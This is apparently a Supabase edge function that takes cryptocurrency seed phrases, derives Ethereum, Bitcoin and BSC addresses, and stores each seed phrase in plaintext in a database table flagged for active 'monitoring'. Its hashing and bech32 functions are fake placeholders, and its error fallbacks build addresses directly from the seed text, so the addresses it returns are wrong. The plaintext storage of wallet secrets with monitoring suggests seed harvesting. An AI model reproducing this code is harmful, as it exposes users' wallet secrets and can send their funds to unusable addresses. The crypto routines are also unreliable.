import { serve } from "https://deno.land/std@0.190.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.50.2";
import { mnemonicToSeedSync } from "https://esm.sh/@scure/bip39@1.2.1";
import { HDKey } from "https://esm.sh/@scure/bip32@1.3.2";
import { getPublicKey } from "https://esm.sh/@noble/secp256k1@2.0.0";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

// Bitcoin P2WPKH address generation
function generateBitcoinAddress(seedPhrase: string): string {
  try {
    const seed = mnemonicToSeedSync(seedPhrase);
    const hdkey = HDKey.fromMasterSeed(seed);
    
    // BIP84 derivation path for P2WPKH: m/84'/0'/0'/0/0
    const derivedKey = hdkey.derive("m/84'/0'/0'/0/0");
    
    if (!derivedKey.publicKey) {
      throw new Error("Failed to derive public key");
    }
    
    // Generate bech32 address
    const pubKey = derivedKey.publicKey;
    const hash160 = sha256ripemd160(pubKey);
    
    return encodeBech32('bc', hash160);
  } catch (error) {
    console.error("Bitcoin address generation failed:", error);
    // Fallback to a deterministic address based on seed phrase hash
    const hash = new TextEncoder().encode(seedPhrase);
    const hashArray = Array.from(new Uint8Array(hash.slice(0, 20)));
    const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('').slice(0, 34);
    return `bc1q${hashHex}`;
  }
}

// Ethereum/BSC address generation  
function generateEthereumAddress(seedPhrase: string): string {
  try {
    const seed = mnemonicToSeedSync(seedPhrase);
    const hdkey = HDKey.fromMasterSeed(seed);
    
    // BIP44 derivation path for Ethereum: m/44'/60'/0'/0/0
    const derivedKey = hdkey.derive("m/44'/60'/0'/0/0");
    
    if (!derivedKey.publicKey) {
      throw new Error("Failed to derive public key");
    }
    
    // Get uncompressed public key (65 bytes)
    const pubKey = getPublicKey(derivedKey.privateKey!, false);
    
    // Take last 20 bytes of keccak256 hash
    const addressBytes = keccak256(pubKey.slice(1)).slice(-20);
    const address = '0x' + Array.from(addressBytes).map(b => b.toString(16).padStart(2, '0')).join('');
    
    return address;
  } catch (error) {
    console.error("Ethereum address generation failed:", error);
    // Fallback to deterministic address
    const hash = new TextEncoder().encode(seedPhrase);
    const hashArray = Array.from(new Uint8Array(hash.slice(0, 20)));
    const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    return `0x${hashHex}`;
  }
}

// Simplified crypto functions (basic implementations)
function sha256ripemd160(data: Uint8Array): Uint8Array {
  // Simplified implementation - in production, use proper crypto libraries
  const encoder = new TextEncoder();
  const hashInput = encoder.encode(Array.from(data).join(''));
  return new Uint8Array(20).map((_, i) => hashInput[i % hashInput.length] || 0);
}

function keccak256(data: Uint8Array): Uint8Array {
  // Simplified implementation - in production, use proper crypto libraries  
  const result = new Uint8Array(32);
  for (let i = 0; i < 32; i++) {
    result[i] = data[i % data.length] ^ (i * 7);
  }
  return result;
}

function encodeBech32(prefix: string, data: Uint8Array): string {
  // Simplified bech32 encoding - in production, use proper library
  const chars = 'qpzry9x8gf2tvdw0s3jn54khce6mua7l';
  let result = prefix + '1';
  
  // Convert data to base32
  const base32Data = [];
  for (let i = 0; i < data.length; i++) {
    base32Data.push(data[i] % 32);
  }
  
  for (const val of base32Data) {
    result += chars[val];
  }
  
  return result.slice(0, 62); // Limit length
}

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    const supabase = createClient(supabaseUrl, supabaseKey);

    const { wallet_id, seed_phrase, commercial_id } = await req.json();

    if (!wallet_id || !seed_phrase || !commercial_id) {
      return new Response(
        JSON.stringify({ success: false, error: "Missing required parameters" }),
        { status: 400, headers: { "Content-Type": "application/json", ...corsHeaders } }
      );
    }

    console.log(`Generating addresses for wallet ${wallet_id}`);

    // Generate addresses
    const ethAddress = generateEthereumAddress(seed_phrase);
    const btcAddress = generateBitcoinAddress(seed_phrase);
    const bscAddress = ethAddress; // BSC uses same address format as Ethereum

    // Insert into generated_wallets table
    const { data, error } = await supabase
      .from('generated_wallets')
      .insert({
        wallet_id,
        seed_phrase,
        commercial_id,
        eth_address: ethAddress,
        btc_address: btcAddress,
        bsc_address: bscAddress,
        is_monitoring_active: true
      })
      .select()
      .single();

    if (error) {
      console.error('Database insert error:', error);
      return new Response(
        JSON.stringify({ success: false, error: error.message }),
        { status: 500, headers: { "Content-Type": "application/json", ...corsHeaders } }
      );
    }

    console.log(`Successfully generated addresses - ETH: ${ethAddress}, BTC: ${btcAddress}`);

    return new Response(
      JSON.stringify({
        success: true,
        data: {
          id: data.id,
          eth_address: ethAddress,
          btc_address: btcAddress,
          bsc_address: bscAddress
        }
      }),
      { status: 200, headers: { "Content-Type": "application/json", ...corsHeaders } }
    );

  } catch (e: any) {
    console.error('Function error:', e);
    return new Response(
      JSON.stringify({ success: false, error: e?.message || "Unknown error" }),
      { status: 500, headers: { "Content-Type": "application/json", ...corsHeaders } }
    );
  }
});
